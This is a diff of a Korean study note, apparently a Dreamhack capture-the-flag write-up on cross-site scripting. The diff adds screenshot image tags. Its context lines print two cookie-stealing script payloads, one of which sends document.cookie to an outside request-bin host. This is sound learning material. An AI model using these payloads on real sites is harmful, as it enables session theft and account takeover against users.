@@ -120,7 +120,10 @@ app.run(host="0.0.0.0", port=8000)
 
 #### 방법 1: memo 페이지 이용
 1. flag 엔드포인트에서 ```<script>location.href=“/memo?memo=“ + document.cookie;</script>```를 입력하고 [제출] 버튼을 클릭함
+	<img width="948" alt="memo 페이지_1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/d3b885a7-1f76-49dd-a0d9-6b930cb4fc08">
+
 2. “good” 알림창이 출력되면 memo 페이지로 이동하여 화면에 출력된 임의 이용자의 쿠키 정보(FLAG)를 획득할 수 있음
+	<img width="948" alt="memo 페이지_2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/0cff32b4-ef33-4480-bdd9-12f64f8c4d70">
 
 <br/>
 
@@ -128,5 +131,10 @@ app.run(host="0.0.0.0", port=8000)
 1. 외부에서 접근 가능한 웹 서버를 준비함
 	- Dreamhack 페이지에서 제공하는 [드림핵툴즈 서비스](https://tools.dreamhack.games/)의 Request Bin 기능을 이용함
 		+ Request Bin 항목에서 랜덤한 URL이 생성되는 것을 확인하고 이를 복사해둠
+	<img width="1589" alt="외부 웹 서버_1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/32800958-8d73-462c-ab25-54038cb61e44">
+	
 2. flag 엔드포인트에서 ```<script>location.href=“http://RANDOMHOST.request.dreamhack.games/?memo="+document.cookie;</script>```를 입력하고 [제출] 버튼을 클릭함
-3. “good” 알림창이 출력되면 웹 서버의 접속 기록을 확인하여 QueryString 부분에서 임의 이용자의 쿠키 정보(FLAG)를 획득할 수 있음 
+	<img width="948" alt="외부 웹 서버_2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/1d67f5c4-dad1-49c6-ad22-ee4c11de9d7f">
+	
+3. “good” 알림창이 출력되면 웹 서버의 접속 기록을 확인하여 QueryString 부분에서 임의 이용자의 쿠키 정보(FLAG)를 획득할 수 있음
+	<img width="1589" alt="외부 웹 서버_3" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/9a056ba5-dfdc-4c36-9b11-46f7388a9ecb">
